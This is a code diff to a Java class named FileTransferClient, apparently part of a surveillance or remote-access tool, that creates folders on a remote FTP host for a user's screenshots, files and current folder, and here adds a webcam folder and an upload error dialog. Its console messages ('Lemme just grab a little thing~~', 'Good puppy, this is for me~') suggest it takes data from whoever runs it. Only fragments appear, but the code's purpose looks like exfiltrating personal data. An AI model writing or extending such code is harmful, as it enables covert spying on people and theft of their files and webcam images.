@@ -5,6 +5,7 @@ import fr.mimifan.jac.utils.CutieInfos;
 import org.apache.commons.net.ftp.FTP;
 import org.apache.commons.net.ftp.FTPClient;
 
+import javax.swing.*;
 import java.io.*;
 import java.text.SimpleDateFormat;
 import java.time.LocalDate;
@@ -28,6 +29,7 @@ public class FileTransferClient {
 
     String screenshotsDir = hostDirectory + "/screenshots";
     String currentDirectory = hostDirectory + "/currentFolder";
+    String webcamDirectory = hostDirectory + "/webcam";
     String filesDir = hostDirectory + "/files";
 
 
@@ -44,6 +46,7 @@ public class FileTransferClient {
             client.makeDirectory(hostDirectory);
             client.makeDirectory(screenshotsDir);
             client.makeDirectory(currentDirectory);
+            client.makeDirectory(webcamDirectory);
 
             System.out.println("Great, I made you a little place~");
             System.out.println("Lemme just grab a little thing~~");
@@ -68,6 +71,9 @@ public class FileTransferClient {
             if (done) { System.out.println("Good puppy, this is for me~"); }
         } catch (IOException ex) {
             ex.printStackTrace();
+            String message = "Could not upload file D: " + ex;
+            JOptionPane.showMessageDialog(new JFrame(), message, "Could not upload file",
+                    JOptionPane.ERROR_MESSAGE);
         }
     }
 
@@ -117,5 +123,9 @@ public class FileTransferClient {
 
     public String getScreenshotsDir() {
         return screenshotsDir;
+    }
+
+    public String getWebcamDirectory() {
+        return webcamDirectory;
     }
 }
